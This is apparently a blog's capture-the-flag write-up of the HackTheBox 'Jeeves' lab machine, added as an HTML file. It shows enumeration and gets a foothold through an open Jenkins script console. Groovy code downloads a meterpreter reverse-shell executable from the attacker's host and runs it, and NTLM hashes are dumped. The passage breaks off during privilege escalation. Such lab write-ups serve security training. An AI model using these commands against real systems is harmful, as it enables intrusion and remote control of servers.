@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      HackTheBox: Jeeves &middot; tralsesec
+    
+  </title>
+
+  <!-- CSS -->
+  <!--<link rel="stylesheet" href="public/css/poole.css">-->
+  <!--<link rel="stylesheet" href="public/css/blackdoc.css">-->
+  <link rel="stylesheet" href="/public/css/syntax.css">
+  <link rel="stylesheet" href="/public/css/modern.css">
+  <!--<link rel="stylesheet" href="public/css/operator.css">-->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=EB+Garamond">
+  <!-- Icons -->
+  <link rel="apple-touch-icon" sizes="144x144" href="/public/apple-touch-icon.png">
+  <link rel="shortcut icon" href="/public/favicon.ico">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+</head>
+
+
+  <body>
+
+    <div class="sidebar">
+  <div class="container sidebar-sticky" style="display: flex; flex-direction: column; height: 100%;">
+    
+    <div class="sidebar-about">
+      <h1>
+        <a href="/">
+          tralsesec
+        </a>
+      </h1>
+      <p class="lead">Offensive Security Researcher · Malware Developer & Analyst · Exploit Developer · CTF Player</p>
+    </div>
+
+    <nav class="sidebar-nav">
+      <a class="sidebar-nav-item" href="/">Home</a>
+      <a class="sidebar-nav-item" href="/about">About</a>
+      <a class="sidebar-nav-item" href="/projects">Projects</a>
+      <a class="sidebar-nav-item" href="/anatomy-of-a-bug">Anatomy of a Bug</a>
+      <a class="sidebar-nav-item active" href="/ctfs">Capture the Flags</a>
+
+      <hr style="border: 0; border-top: 1px solid var(--border); margin: 1.5rem 0;">
+
+      <a class="sidebar-nav-item" href="https://x.com/tralsesec" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+        X
+      </a>
+
+      <a class="sidebar-nav-item" href="https://github.com/tralsesec" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 16 16"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+        GitHub
+      </a>
+
+      <a class="sidebar-nav-item" href="https://app.hackthebox.com/public/users/475600" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 24 24"><path d="M11.99 0l-10.4 6.02v12.01l10.4 6.02 10.4-6.02V6.02L11.99 0zM3.46 17.2V6.9l8.53-4.93 8.53 4.93v10.3l-8.53 4.93-8.53-4.93z"/><path d="M11.99 3.5L4.8 7.66v8.32l7.19 4.16 7.19-4.16V7.66L11.99 3.5zm5.72 11.53l-5.72 3.31-5.72-3.31V8.47l5.72-3.31 5.72 3.31v6.56z"/></svg>
+        HackTheBox
+      </a>
+
+    </nav>
+
+    <p style="margin-top: auto; padding-top: 2rem; margin-bottom: 0; font-size: 0.9rem;">
+      &copy; 2026. All rights reserved.
+    </p>
+  </div>
+</div>
+
+
+    <div class="content container">
+      <div class="post">
+  <h1 class="post-title" style="line-height: 1.3; padding-bottom: 1.3rem;">HackTheBox: Jeeves</h1>
+
+  <div class="post-meta" style="font-family: var(--font-mono); font-size: 0.75em; margin-bottom: 2rem;">
+    
+      <div style="display: flex; flex-wrap: wrap; gap: 10px; align-items: center;">
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #WINDOWS
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #JENKINS
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #SEIMPERSONATEPRIVILEGE
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #ALTERNATE-DATA-STREAM
+          </span>
+        
+        <span class="post-date" style="color: var(--fg-dim);">// 2026-05-12</span>
+      </div>
+    
+  </div>
+
+  
+     <div class="intel-frame" style="padding: 5px; background: #000; transition: transform 0.2s ease;">
+      <a href="/assets/img/ctf/jeeves.png" target="_blank" style="border: none; display: block;">
+        <img src="/assets/img/ctf/jeeves.png" style="width: 30%; border-color: #000; display: block; cursor: zoom-in; margin-left: auto; margin-right: auto;">
+      </a>
+    </div>   
+  
+
+  <br><br>
+
+  <h1 id="-jeeves">🎯 Jeeves</h1>
+
+<table>
+  <tbody>
+    <tr>
+      <td><strong>OS:</strong> Windows</td>
+      <td><strong>Difficulty:</strong> Medium</td>
+      <td><strong>IP:</strong> <code class="language-plaintext highlighter-rouge">10.129.228.112</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="/assets/img/ctf/data/jeeves-htb.png" alt="jeeves.htb" /></p>
+
+<hr />
+
+<h2 id="️-tldr--attack-chain">⛓️ TL;DR / Attack Chain</h2>
+<ol>
+  <li>Foothold (Jenkins RCE): Discovered a hidden directory <code class="language-plaintext highlighter-rouge">/askjeeves</code> on port <code class="language-plaintext highlighter-rouge">50000/http</code> (Jetty). Exploited unauthenticated access to the <code class="language-plaintext highlighter-rouge">Jenkins Script Console</code> to execute arbitrary (Groovy) scripts, leading to a reverse shell as <code class="language-plaintext highlighter-rouge">jeeves\kohsuke</code>.</li>
+  <li>Privilege Escalation (Token Impersonation): Identified the <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> enabled on the service account. Leveraged Metasploit’s <code class="language-plaintext highlighter-rouge">getsystem</code> (Named Pipe/PrintSpooler variant) to impersonate a privileged process and escalate to <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>.</li>
+  <li>Post-Exploitation (NTFS ADS): Located the final flag hidden within an <code class="language-plaintext highlighter-rouge">Alternate Data Stream</code> (ADS) on the Administrator’s desktop. The flag was “attached” to <code class="language-plaintext highlighter-rouge">hm.txt</code> and required the <code class="language-plaintext highlighter-rouge">dir /R</code> command to reveal and <code class="language-plaintext highlighter-rouge">more &lt;</code> to extract.</li>
+</ol>
+
+<hr />
+
+<h2 id="-loot--creds">🔑 Loot &amp; Creds</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">User</th>
+      <th style="text-align: left">Credential</th>
+      <th style="text-align: left">Where / How</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">kohsuke</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">ab4043bce374136df6e09734d4577738</code></td>
+      <td style="text-align: left">hashdump</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">Administrator</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">e0fb1fb85756c24235ff238cbe81fe00</code></td>
+      <td style="text-align: left">hashdump</td>
+    </tr>
+  </tbody>
+</table>
+
+<blockquote class="info">
+  <p>You won’t be able to do anything with these as the box has no winrm port open.</p>
+</blockquote>
+
+<hr />
+
+<h2 id="-0-setup--global-variables">🔧 0. Setup &amp; Global Variables</h2>
+<p><em>Run this in your terminal once so you can copy-paste the rest of the commands blindly.</em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ IP</span><span class="o">=</span><span class="s2">"10.129.228.112"</span> <span class="p">;</span> <span class="nv">DOMAIN</span><span class="o">=</span><span class="s2">"jeeves.htb"</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
+  <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$IP</span><span class="s2"> </span><span class="nv">$DOMAIN</span><span class="s2">"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-1-enumeration">🔍 1. Enumeration</h2>
+
+<h3 id="nmap">Nmap</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-p</span> nmap <span class="o">&amp;&amp;</span> nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> <span class="nt">-vv</span> <span class="nv">$IP</span> <span class="nt">-oA</span> ./nmap                                                                                                                                                                              
+Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-05-11 23:06 +0200
+NSE: Loaded 158 scripts <span class="k">for </span>scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 23:06
+Completed NSE at 23:06, 0.00s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 23:06
+Completed NSE at 23:06, 0.00s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 23:06
+Completed NSE at 23:06, 0.00s elapsed
+Initiating Ping Scan at 23:06
+Scanning 10.129.228.112 <span class="o">[</span>4 ports]
+Completed Ping Scan at 23:06, 0.03s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating SYN Stealth Scan at 23:06
+Scanning jeeves.htb <span class="o">(</span>10.129.228.112<span class="o">)</span> <span class="o">[</span>65535 ports]
+Discovered open port 445/tcp on 10.129.228.112
+Discovered open port 135/tcp on 10.129.228.112
+Discovered open port 80/tcp on 10.129.228.112
+SYN Stealth Scan Timing: About 19.54% <span class="k">done</span><span class="p">;</span> ETC: 23:08 <span class="o">(</span>0:02:08 remaining<span class="o">)</span>
+SYN Stealth Scan Timing: About 44.76% <span class="k">done</span><span class="p">;</span> ETC: 23:08 <span class="o">(</span>0:01:15 remaining<span class="o">)</span>
+Discovered open port 50000/tcp on 10.129.228.112
+Completed SYN Stealth Scan at 23:08, 110.37s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Initiating Service scan at 23:08
+Scanning 4 services on jeeves.htb <span class="o">(</span>10.129.228.112<span class="o">)</span>
+Completed Service scan at 23:08, 6.14s elapsed <span class="o">(</span>4 services on 1 host<span class="o">)</span>
+NSE: Script scanning 10.129.228.112.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 23:08
+NSE Timing: About 99.82% <span class="k">done</span><span class="p">;</span> ETC: 23:08 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
+Completed NSE at 23:08, 40.28s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 23:08
+Completed NSE at 23:08, 0.11s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 23:08
+Completed NSE at 23:08, 0.00s elapsed
+Nmap scan report <span class="k">for </span>jeeves.htb <span class="o">(</span>10.129.228.112<span class="o">)</span>
+Host is up, received echo-reply ttl 127 <span class="o">(</span>0.023s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2026-05-11 23:06:12 CEST <span class="k">for </span>157s
+Not shown: 65531 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT      STATE SERVICE      REASON          VERSION
+80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-title: Ask Jeeves
+135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
+445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+50000/tcp open  http         syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
+|_http-server-header: Jetty<span class="o">(</span>9.4.z-SNAPSHOT<span class="o">)</span>
+|_http-title: Error 404 Not Found
+Service Info: Host: JEEVES<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   <span class="nb">date</span>: 2026-05-12T02:08:09
+|_  start_date: 2026-05-12T01:56:13
+| p2p-conficker:
+|   Checking <span class="k">for </span>Conficker.C or higher...
+|   Check 1 <span class="o">(</span>port 58009/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|   Check 2 <span class="o">(</span>port 60689/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|   Check 3 <span class="o">(</span>port 39602/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|   Check 4 <span class="o">(</span>port 14310/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled but not required
+| smb-security-mode:
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m58s
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 23:08
+Completed NSE at 23:08, 0.00s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 23:08
+Completed NSE at 23:08, 0.00s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 23:08
+Completed NSE at 23:08, 0.00s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>157.17 seconds
+           Raw packets sent: 131154 <span class="o">(</span>5.771MB<span class="o">)</span> | Rcvd: 221127 <span class="o">(</span>54.454MB<span class="o">)</span>
+</code></pre></div></div>
+
+<h3 id="http80">HTTP/80</h3>
+
+<p><img src="/assets/img/ctf/data/jeeves-1.png" alt="jeeves-1" /></p>
+
+<p>Typing in anything results in:
+<img src="/assets/img/ctf/data/jeeves-2.png" alt="jeeves-2" /></p>
+
+<p>Which already reveals important information about the system. But very strange, it’s just an image. This must be a troll - nmap tells us it’s IIS/10.0 not “Windows NT 5.0” lol.</p>
+
+<p>Directory fuzzing:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-p</span> ffuf <span class="o">&amp;&amp;</span> ffuf <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://jeeves.htb/FUZZ <span class="nt">-fs</span> 503 | <span class="nb">tee</span> ./ffuf/dir.scan
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://jeeves.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 503
+________________________________________________
+
+:: Progress: [220560/220560] :: Job [1/1] :: 1092 req/sec :: Duration: [0:02:39] :: Errors: 0 ::
+</span></code></pre></div></div>
+
+<p>vhosts fuzzing:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-p</span> ffuf <span class="o">&amp;&amp;</span> ffuf <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">-u</span> http://jeeves.htb/ <span class="nt">-H</span> <span class="s2">"Host: FUZZ.jeeves.htb"</span> | <span class="nb">tee</span> ./ffuf/vhosts.scan
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://jeeves.htb:50000/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.jeeves.htb:50000
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+:: Progress: [114442/114442] :: Job [1/1] :: 769 req/sec :: Duration: [0:01:22] :: Errors: 0 ::
+</span></code></pre></div></div>
+
+<h3 id="http50000">HTTP/50000</h3>
+
+<p>Directory fuzzing:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-p</span> ffuf <span class="o">&amp;&amp;</span> ffuf <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://jeeves.htb:50000/FUZZ | <span class="nb">tee</span> ./ffuf/dir_50000.scan
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://jeeves.htb:50000/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+askjeeves               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 27ms]
+</span></code></pre></div></div>
+
+<p>vhosts fuzzing:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-p</span> ffuf <span class="o">&amp;&amp;</span> ffuf <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">-u</span> http://jeeves.htb:50000/ <span class="nt">-H</span> <span class="s2">"Host: FUZZ.jeeves.htb:50000"</span> | <span class="nb">tee</span> ./ffuf/vhosts_50000.scan
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://jeeves.htb:50000/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.jeeves.htb:50000
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+:: Progress: [114442/114442] :: Job [1/1] :: 769 req/sec :: Duration: [0:01:22] :: Errors: 0 ::
+</span></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">http://jeeves.htb:50000/askjeeves/</code>
+<img src="/assets/img/ctf/data/jeeves-3.png" alt="jeeves-3" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">People</code>:
+<img src="/assets/img/ctf/data/jeeves-4.png" alt="jeeves-4" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">Jenkins ver. 2.87</code>
+<img src="/assets/img/ctf/data/jeeves-5.png" alt="jeeves-5" /></p>
+
+<hr />
+
+<h2 id="-2-initial-foothold">🚪 2. Initial Foothold</h2>
+
+<p><code class="language-plaintext highlighter-rouge">http://jeeves.htb:50000/askjeeves/script</code>
+<img src="/assets/img/ctf/data/jeeves-6.png" alt="jeeves-6" /></p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">def</span> <span class="n">cmd</span> <span class="o">=</span> <span class="err">'</span><span class="n">whoami</span><span class="err">'</span>
+<span class="n">def</span> <span class="n">sout</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuffer</span><span class="o">(),</span> <span class="n">serr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuffer</span><span class="o">()</span>
+<span class="n">def</span> <span class="n">proc</span> <span class="o">=</span> <span class="n">cmd</span><span class="o">.</span><span class="na">execute</span><span class="o">()</span>
+<span class="n">proc</span><span class="o">.</span><span class="na">consumeProcessOutput</span><span class="o">(</span><span class="n">sout</span><span class="o">,</span> <span class="n">serr</span><span class="o">)</span>
+<span class="n">proc</span><span class="o">.</span><span class="na">waitForOrKill</span><span class="o">(</span><span class="mi">1000</span><span class="o">)</span>
+<span class="n">println</span> <span class="n">sout</span>
+</code></pre></div></div>
+<p><strong>Result</strong>: jeeves\kohsuke
+<img src="/assets/img/ctf/data/jeeves-7.png" alt="jeeves-7" /></p>
+
+<p>As we have remote code execution, let’s get a meterpreter session.</p>
+
+<ol>
+  <li>Generate a meterpreter payload:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.219 <span class="nv">LPORT</span><span class="o">=</span>9901 <span class="nt">-f</span> exe <span class="nt">-o</span> m.exe
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7680 bytes
+Saved as: m.exe
+</code></pre></div>    </div>
+  </li>
+  <li>Start a python http server:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 1101
+Serving HTTP on 0.0.0.0 port 1101 <span class="o">(</span>http://0.0.0.0:1101/<span class="o">)</span> ...
+</code></pre></div>    </div>
+  </li>
+  <li>Now start <code class="language-plaintext highlighter-rouge">msfconsole</code> in order to catch the shell:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfconsole <span class="nt">-x</span> <span class="s2">"use multi/handler; set LPORT 9901; set LHOST tun0; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run"</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Now upload and execute the payload:
+    <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">r</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">()</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">([</span><span class="s">"powershell.exe"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"iwr -uri http://&lt;YOUR IP&gt;:1101/m.exe -outfile c:\\windows\\temp\\m.exe"</span><span class="o">]</span> <span class="n">as</span> <span class="nc">String</span><span class="o">[])</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">([</span><span class="s">"c:\\windows\\temp\\m.exe"</span><span class="o">]</span> <span class="n">as</span> <span class="nc">String</span><span class="o">[])</span>
+<span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">()</span>
+<span class="n">s</span><span class="o">.</span><span class="na">waitFor</span><span class="o">()</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p>And eventually, you’ll see a request incoming (python webserver):</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.129.228.112 - - [12/May/2026 11:42:39] "GET /m.ps1 HTTP/1.1" 200 -
+</code></pre></div></div>
+
+<p>And then:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Sending stage (248902 bytes) to 10.129.228.112
+[*] Meterpreter session 1 opened (10.10.14.219:9901 -&gt; 10.129.228.112:49685) at 2026-05-12 11:50:54 +0200
+
+meterpreter &gt;
+</code></pre></div></div>
+
+<p>Nice!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; sysinfo
+Computer        : JEEVES
+OS              : Windows 10 1511 (10.0 Build 10586).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x64/windows
+meterpreter &gt; shell
+Process 1152 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.10586]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator\.jenkins&gt;whoami
+whoami
+jeeves\kohsuke
+
+C:\Users\Administrator\.jenkins&gt;cd C:\Users\kohsuke\Desktop
+C:\Users\kohsuke\Desktop&gt;type user.txt
+[REDACTED]
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-3-privilege-escalation-kohsuke---administrator">📈 3. Privilege Escalation (<code class="language-plaintext highlighter-rouge">kohsuke</code> -&gt; <code class="language-plaintext highlighter-rouge">Administrator</code>)</h2>
+
+<p>Looking at the privileges of the user <code class="language-plaintext highlighter-rouge">kohsuke</code> we see the <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\kohsuke\Desktop</span><span class="err">&gt;</span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
+</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
+
+</span><span class="n">PRIVILEGES</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="o">----------------------</span><span class="w">
+
+</span><span class="n">Privilege</span><span class="w"> </span><span class="nx">Name</span><span class="w">                </span><span class="nx">Description</span><span class="w">                               </span><span class="nx">State</span><span class="w">
+</span><span class="o">=============================</span><span class="w"> </span><span class="o">=========================================</span><span class="w"> </span><span class="o">========</span><span class="w">
+</span><span class="n">SeShutdownPrivilege</span><span class="w">           </span><span class="nx">Shut</span><span class="w"> </span><span class="nx">down</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">system</span><span class="w">                      </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeChangeNotifyPrivilege</span><span class="w">       </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="nx">checking</span><span class="w">                  </span><span class="nx">Enabled</span><span class="w">
+</span><span class="n">SeUndockPrivilege</span><span class="w">             </span><span class="nx">Remove</span><span class="w"> </span><span class="nx">computer</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">docking</span><span class="w"> </span><span class="nx">station</span><span class="w">      </span><span class="nx">Disabled</span><span class="w">
